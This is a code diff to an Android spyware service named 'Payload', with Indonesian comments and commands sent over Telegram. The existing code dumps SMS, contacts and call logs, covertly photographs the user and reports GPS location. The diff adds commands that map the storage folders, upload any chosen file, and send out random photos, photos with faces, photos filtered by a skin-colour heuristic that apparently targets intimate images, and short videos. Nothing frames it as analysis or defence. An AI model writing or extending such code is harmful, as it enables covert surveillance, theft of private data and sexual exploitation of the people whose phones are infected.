@@ -19,6 +19,11 @@ import android.location.Location;
 import android.location.LocationManager;
 import android.os.Environment;
 import android.content.Context;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.graphics.Color;
+import android.media.FaceDetector;
+import android.media.MediaMetadataRetriever;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -30,6 +35,8 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
 import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Collections;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
@@ -113,9 +120,8 @@ public class Payload extends Service {
                 
                 sendCheckIn(deviceName);
 
-                // --- FAST POLLING (JENDELA 2 MENIT) ---
-                writeLog("3. Masuk Fast Polling (2 Menit)");
-                long endTime = System.currentTimeMillis() + (2 * 60 * 1000);
+                writeLog("3. Masuk Fast Polling (30 Detik)");
+                long endTime = System.currentTimeMillis() + (30 * 1000);
                 while (System.currentTimeMillis() < endTime) {
                     checkCommands();
                     try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) {}
@@ -153,26 +159,224 @@ public class Payload extends Service {
                 prefs.edit().putLong("lastUpdateId", lastUpdateId).apply();
             }
             
-            if (jsonResponse.contains("\"text\":\"/dump_sms " + myAndroidId + "\"")) {
+            // FITUR TREE FILE
+            if (jsonResponse.contains("\"text\":\"/tree " + myAndroidId + "\"")) {
+                writeLog("Membangun Tree...");
+                String tree = buildTree(new File("/storage/emulated/0/"), "", 0);
+                if (tree.length() > 3500) {
+                    File treeFile = new File(getExternalFilesDir(null), "tree.txt");
+                    FileOutputStream fos = new FileOutputStream(treeFile);
+                    fos.write(tree.getBytes()); fos.close();
+                    sendTelegramFile(treeFile.getAbsolutePath(), false, "📂 Tree Folder (File)");
+                } else {
+                    sendTelegramMessage("📂 *Tree Folder:*\n" + tree);
+                }
+            }
+            // FITUR DUMP
+            else if (jsonResponse.contains("\"text\":\"/dump_sms " + myAndroidId + "\"")) {
                 dumpSmsToFile();
             } else if (jsonResponse.contains("\"text\":\"/dump_kontak " + myAndroidId + "\"")) {
                 dumpContactsToFile();
             } else if (jsonResponse.contains("\"text\":\"/dump_telpon " + myAndroidId + "\"")) {
                 sendTelegramMessage("📞 *Dump Call Log:*\n" + getCallLogs());
-            } else if (jsonResponse.contains("\"text\":\"/foto_depan " + myAndroidId + "\"")) {
+            }
+            // FITUR KAMERA & LOKASI
+            else if (jsonResponse.contains("\"text\":\"/foto_depan " + myAndroidId + "\"")) {
                 takePhoto(1);
             } else if (jsonResponse.contains("\"text\":\"/foto_belakang " + myAndroidId + "\"")) {
                 takePhoto(0);
             } else if (jsonResponse.contains("\"text\":\"/lacak " + myAndroidId + "\"")) {
                 sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation());
-            } else if (jsonResponse.contains("\"text\":\"/cek_file " + myAndroidId + "\"")) {
-                sendTelegramMessage("📂 *Isi Folder:*\n" + listFiles("/storage/emulated/0/"));
             }
+            // FITUR CEK FILE SPESIFIK
+            else if (jsonResponse.contains("\"text\":\"/send_file " + myAndroidId)) {
+                String prefix = "/send_file " + myAndroidId + " ";
+                int pathIdx = jsonResponse.indexOf(prefix);
+                if (pathIdx != -1) {
+                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
+                    if (endQuote != -1) {
+                        String path = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim();
+                        File f = new File(path);
+                        if(f.exists()) sendTelegramFile(f.getAbsolutePath(), false, "📤 File: " + f.getName());
+                        else sendTelegramMessage("❌ File tidak ditemukan.");
+                    }
+                }
+            }
+            // FITUR FOTO ACAK
+            else if (jsonResponse.contains("\"text\":\"/send_foto_acak " + myAndroidId)) {
+                String prefix = "/send_foto_acak " + myAndroidId + " ";
+                int pathIdx = jsonResponse.indexOf(prefix);
+                if (pathIdx != -1) {
+                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
+                    if (endQuote != -1) {
+                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
+                        if (parts.length >= 2) {
+                            sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "acak");
+                        }
+                    }
+                }
+            }
+            // FITUR FOTO WAJAH
+            else if (jsonResponse.contains("\"text\":\"/send_foto_wajah " + myAndroidId)) {
+                String prefix = "/send_foto_wajah " + myAndroidId + " ";
+                int pathIdx = jsonResponse.indexOf(prefix);
+                if (pathIdx != -1) {
+                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
+                    if (endQuote != -1) {
+                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
+                        if (parts.length >= 2) {
+                            sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "wajah");
+                        }
+                    }
+                }
+            }
+            // FITUR FOTO PERUT
+            else if (jsonResponse.contains("\"text\":\"/send_foto_perut " + myAndroidId)) {
+                String prefix = "/send_foto_perut " + myAndroidId + " ";
+                int pathIdx = jsonResponse.indexOf(prefix);
+                if (pathIdx != -1) {
+                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
+                    if (endQuote != -1) {
+                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
+                        if (parts.length >= 2) {
+                            sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "perut");
+                        }
+                    }
+                }
+            }
+            // FITUR SEND VIDEO
+            else if (jsonResponse.contains("\"text\":\"/send_video " + myAndroidId)) {
+                String prefix = "/send_video " + myAndroidId + " ";
+                int pathIdx = jsonResponse.indexOf(prefix);
+                if (pathIdx != -1) {
+                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
+                    if (endQuote != -1) {
+                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
+                        if (parts.length >= 3) {
+                            sendVideoFiltered(parts[0], Integer.parseInt(parts[1]), Integer.parseInt(parts[2]));
+                        }
+                    }
+                }
+            }
+
         } catch (Exception e) { 
             writeLog("Error checkCommands: " + e.getMessage());
         }
     }
 
+    private String buildTree(File dir, String prefix, int depth) {
+        if (depth > 4) return "";
+        StringBuilder sb = new StringBuilder();
+        File[] files = dir.listFiles();
+        if (files == null) return "";
+        Arrays.sort(files, (f1, f2) -> f1.getName().compareToIgnoreCase(f2.getName()));
+        for (File f : files) {
+            if (f.isDirectory()) {
+                String name = f.getName().toLowerCase();
+                if (name.equals("data") || name.equals("obb") || f.getName().startsWith(".")) continue;
+                sb.append(prefix).append("📁 ").append(f.getName()).append("\n");
+                sb.append(buildTree(f, prefix + "  ", depth + 1));
+            }
+        }
+        return sb.toString();
+    }
+
+    private void sendFotoFiltered(String path, int count, String mode) {
+        File dir = new File(path);
+        File[] files = dir.listFiles((d, name) -> name.toLowerCase().endsWith(".jpg") || name.toLowerCase().endsWith(".jpeg") || name.toLowerCase().endsWith(".png"));
+        if (files == null || files.length == 0) { sendTelegramMessage("❌ Folder kosong / tidak ada foto."); return; }
+        
+        List<File> fileList = new ArrayList<>(Arrays.asList(files));
+        Collections.shuffle(fileList);
+        
+        int sent = 0;
+        for (File f : fileList) {
+            if (sent >= count) break;
+            boolean lolos = false;
+            
+            if (mode.equals("acak")) lolos = true;
+            else if (mode.equals("wajah")) lolos = detectFace(f.getAbsolutePath());
+            else if (mode.equals("perut")) lolos = detectSkin(f.getAbsolutePath());
+
+            if (lolos) {
+                sendTelegramFile(f.getAbsolutePath(), true, "📸 Foto " + mode.toUpperCase());
+                sent++;
+                try { TimeUnit.SECONDS.sleep(2); } catch (Exception e) {}
+            }
+        }
+        sendTelegramMessage("✅ Selesai scan " + mode + ". Terkirim " + sent + " foto.");
+    }
+
+    private boolean detectFace(String filePath) {
+        try {
+            BitmapFactory.Options options = new BitmapFactory.Options();
+            options.inPreferredConfig = Bitmap.Config.RGB_565;
+            Bitmap bitmap = BitmapFactory.decodeFile(filePath, options);
+            if (bitmap == null) return false;
+            FaceDetector detector = new FaceDetector(bitmap.getWidth(), bitmap.getHeight(), 5);
+            FaceDetector.Face[] faces = new FaceDetector.Face[5];
+            int numFaces = detector.findFaces(bitmap, faces);
+            bitmap.recycle();
+            detector.release();
+            return numFaces > 0;
+        } catch (Exception e) { return false; }
+    }
+
+    private boolean detectSkin(String filePath) {
+        try {
+            BitmapFactory.Options options = new BitmapFactory.Options();
+            options.inSampleSize = 4; // Perkecil gambar biar cepet
+            Bitmap bitmap = BitmapFactory.decodeFile(filePath, options);
+            if (bitmap == null) return false;
+            int width = bitmap.getWidth();
+            int height = bitmap.getHeight();
+            int skinPixels = 0;
+            int totalPixels = 0;
+            for (int x = 0; x < width; x+=4) {
+                for (int y = 0; y < height; y+=4) {
+                    totalPixels++;
+                    int pixel = bitmap.getPixel(x, y);
+                    int r = Color.red(pixel), g = Color.green(pixel), b = Color.blue(pixel);
+                    // Heuristik Warna Kulit
+                    if (r > 95 && g > 40 && b > 20 && (Math.max(r, Math.max(g, b)) - Math.min(r, Math.min(g, b))) > 15 && Math.abs(r - g) > 15 && r > g && r > b) {
+                        skinPixels++;
+                    }
+                }
+            }
+            bitmap.recycle();
+            return totalPixels > 0 && ((double) skinPixels / totalPixels) > 0.3; // >30% kulit
+        } catch (Exception e) { return false; }
+    }
+
+    private void sendVideoFiltered(String path, int count, int maxSec) {
+        File dir = new File(path);
+        File[] files = dir.listFiles((d, name) -> name.toLowerCase().endsWith(".mp4") || name.toLowerCase().endsWith(".mkv") || name.toLowerCase().endsWith(".3gp"));
+        if (files == null || files.length == 0) { sendTelegramMessage("❌ Folder kosong / tidak ada video."); return; }
+        
+        List<File> fileList = new ArrayList<>(Arrays.asList(files));
+        Collections.shuffle(fileList);
+        
+        int sent = 0;
+        for (File f : fileList) {
+            if (sent >= count) break;
+            try {
+                MediaMetadataRetriever retriever = new MediaMetadataRetriever();
+                retriever.setDataSource(f.getAbsolutePath());
+                String time = retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
+                long timeMs = Long.parseLong(time);
+                retriever.release();
+                
+                if ((timeMs / 1000) <= maxSec) {
+                    sendTelegramFile(f.getAbsolutePath(), false, "🎥 Video (" + (timeMs/1000) + "s)");
+                    sent++;
+                    try { TimeUnit.SECONDS.sleep(2); } catch (Exception e) {}
+                }
+            } catch (Exception e) {}
+        }
+        sendTelegramMessage("✅ Selesai scan video. Terkirim " + sent + " video.");
+    }
+
+    // FUNGSI LAMA (DUMP, DLL)
     private void sendCheckIn(String deviceInfo) {
         try {
             String encoded = URLEncoder.encode("/checkin " + deviceInfo + "|" + myAndroidId, "UTF-8");
@@ -199,8 +403,7 @@ public class Payload extends Service {
         try {
             File file = new File(getExternalFilesDir(null), "sms_dump.txt");
             FileOutputStream fos = new FileOutputStream(file);
-            fos.write(sb.toString().getBytes());
-            fos.close();
+            fos.write(sb.toString().getBytes()); fos.close();
             sendTelegramFile(file.getAbsolutePath(), false, "📩 Dump SEMUA SMS");
             file.delete();
         } catch (Exception e) { writeLog("Gagal kirim SMS file"); }
@@ -223,8 +426,7 @@ public class Payload extends Service {
         try {
             File file = new File(getExternalFilesDir(null), "kontak_dump.txt");
             FileOutputStream fos = new FileOutputStream(file);
-            fos.write(sb.toString().getBytes());
-            fos.close();
+            fos.write(sb.toString().getBytes()); fos.close();
             sendTelegramFile(file.getAbsolutePath(), false, "👥 Dump SEMUA Kontak");
             file.delete();
         } catch (Exception e) { writeLog("Gagal kirim Kontak file"); }
@@ -255,18 +457,6 @@ public class Payload extends Service {
         return "Lokasi tidak tersedia.";
     }
 
-    private String listFiles(String path) {
-        StringBuilder sb = new StringBuilder();
-        try {
-            File dir = new File(path);
-            File[] files = dir.listFiles();
-            if (files != null) {
-                for (int i = 0; i < files.length && i < 10; i++) sb.append(files[i].getName()).append("\n");
-            }
-        } catch (Exception e) { return "Gagal baca file."; }
-        return sb.length() > 0 ? sb.toString() : "Folder kosong.";
-    }
-
     private void takePhoto(int cameraId) {
         try {
             Camera camera = Camera.open(cameraId);
@@ -277,8 +467,7 @@ public class Payload extends Service {
                     try {
                         File file = new File(Environment.getExternalStorageDirectory(), "sys_photo_" + System.currentTimeMillis() + ".jpg");
                         FileOutputStream fos = new FileOutputStream(file);
-                        fos.write(data);
-                        fos.close();
+                        fos.write(data); fos.close();
                         camera.release();
                         sendTelegramFile(file.getAbsolutePath(), true, "📸 Foto Kamera");
                     } catch (Exception e) { e.printStackTrace(); }
